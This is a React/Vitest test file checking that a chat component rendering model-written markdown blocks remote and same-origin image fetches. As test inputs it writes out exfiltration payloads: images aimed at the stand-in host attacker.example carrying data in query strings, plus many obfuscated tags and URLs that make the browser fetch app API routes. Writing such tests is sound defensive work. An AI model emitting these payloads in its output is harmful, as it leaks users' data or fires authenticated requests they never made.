import { afterEach, describe, expect, it } from "vitest";
import { cleanup, render, screen } from "@testing-library/react";
import { StreamMarkdown } from "./StreamMarkdown";

// sc-157 (QA SEC-003): model markdown must never make the browser fetch a remote image.

afterEach(cleanup);

function images(container: HTMLElement): string[] {
  return Array.from(container.querySelectorAll("img")).map((img) => img.getAttribute("src") ?? "");
}

describe("StreamMarkdown images", () => {
  it.each([
    ["markdown image", "Look: ![secret](https://attacker.example/x.png?q=raid-data)"],
    ["protocol-relative image", "![secret](//attacker.example/x.png)"],
    ["raw html image", 'Look: <img src="https://attacker.example/x.png?q=1" alt="secret">'],
  ])("blocks a remote %s", (_label, md) => {
    const { container } = render(<StreamMarkdown content={md} />);
    expect(images(container).filter((src) => /^(https?:)?\/\//.test(src))).toEqual([]);
    expect(container.innerHTML).not.toContain("attacker.example");
    expect(screen.getByText(/Image blocked: secret/)).toBeTruthy();
  });

  it.each([
    [
      "picture/source srcset (QA BUG-001)",
      '<picture><source srcset="https://attacker.example/x.png?q=SECRET"><img src="/favicon.ico" alt="a"></picture>',
    ],
    ["img srcset", '<img src="/favicon.ico" srcset="https://attacker.example/x.png 2x" alt="a">'],
  ])("drops a remote %s", (_label, md) => {
    for (const streaming of [false, true]) {
      const { container, unmount } = render(<StreamMarkdown content={md} streaming={streaming} />);
      expect(container.innerHTML).not.toContain("attacker.example");
      expect(container.querySelector("source, [srcset]")).toBeNull();
      // While streaming the text inks in gradually, so the image may not be shown yet.
      if (!streaming) expect(images(container)).toEqual([]);
      unmount();
    }
  });

  it("blocks an image with a non-http scheme", () => {
    const { container } = render(<StreamMarkdown content="![x](ftp://attacker.example/x.png)" />);
    expect(container.innerHTML).not.toContain("attacker.example");
    expect(container.querySelector("img")).toBeNull();
  });

  it("blocks a remote image while streaming too", () => {
    const { container } = render(
      <StreamMarkdown content="![x](https://attacker.example/x.png)" streaming />,
    );
    expect(container.innerHTML).not.toContain("attacker.example");
  });

  // sc-272: no image at all, so model markdown can't make the browser GET an app route
  // (an authenticated GET to /api/... runs the endpoint, e.g. PDF generation).
  const ORIGIN = window.location.origin;
  it.each([
    ["relative /api path", "![x](/api/reports/abc.pdf)"],
    ["relative static-looking path", "![x](/static/chart.png)"],
    ["absolute same-origin", `![x](${ORIGIN}/api/conversations/1/report)`],
    ["protocol-relative to this host", `![x](//${window.location.host}/api/x)`],
    ["percent-encoded path", "![x](/%61pi/reports/abc.pdf)"],
    ["encoded slash", "![x](/api%2Freports%2Fabc.pdf)"],
    ["dot segments", "![x](/static/../api/reports/abc.pdf)"],
    ["backslash path", "![x](/\\api/reports/abc.pdf)"],
    ["no leading slash", "![x](api/reports/abc.pdf)"],
    ["query on a static path", "![x](/favicon.ico?next=/api/x)"],
    ["reference-style image", "![x][r]\n\n[r]: /api/reports/abc.pdf"],
    ["raw html img", '<img src="/api/reports/abc.pdf" alt="x">'],
    ["raw html img, upper case + entity", '<IMG SRC="/&#97;pi/reports/abc.pdf" alt="x">'],
    ["linked image", "[![x](/api/reports/abc.pdf)](https://example.com)"],
    ["picture/srcset", '<picture><source srcset="/api/x"><img src="/api/x" srcset="/api/x 2x" alt="a"></picture>'],
    ["other fetching elements", '<video poster="/api/x" src="/api/x"></video><svg><image href="/api/x"/></svg><object data="/api/x"></object><input type="image" src="/api/x"><iframe src="/api/x"></iframe>'],
    ["blob: / half-streamed link scheme", "![x](blob:http://localhost/abc) ![y](streamdown:incomplete-link)"],
    ["padded url and slash-attribute img", '![x](  /api/x  ) <img/src="/api/x"> <img src=//' + window.location.host + '/api/x>'],
    ["head-level fetchers", '<link rel="preload" href="/api/x" as="image"><meta http-equiv="refresh" content="0;url=/api/x"><base href="/api/">'],
    ["inline style url", '<div style="background:url(/api/x)">x</div>'],
  ])("loads no %s", (_label, md) => {
    for (const streaming of [false, true]) {
      const { container, unmount } = render(<StreamMarkdown content={md} streaming={streaming} />);
      expect(container.querySelector("img, source, video, object, embed, iframe, input:not([type=checkbox]), image")).toBeNull();
      // Nothing but a link (which needs a click) may carry the path: no attribute that the
      // browser fetches, whatever the element.
      for (const el of Array.from(container.querySelectorAll("*"))) {
        if (el.tagName === "A") continue;
        for (const attr of Array.from(el.attributes)) {
          expect(attr.value, `${el.tagName}[${attr.name}]`).not.toMatch(/api|favicon|chart\.png/i);
        }
      }
      unmount();
    }
  });

  it("shows the alt text of a blocked image instead", () => {
    render(<StreamMarkdown content="![the chart](/api/x.png)" />);
    expect(screen.getByText(/Image blocked: the chart/)).toBeTruthy();
  });

  it("keeps ordinary links clickable in a new tab", () => {
    render(<StreamMarkdown content="[report](https://www.warcraftlogs.com/reports/abc)" />);
    const link = screen.getByRole("link", { name: "report" });
    expect(link.getAttribute("href")).toBe("https://www.warcraftlogs.com/reports/abc");
    expect(link.getAttribute("target")).toBe("_blank");
  });
});
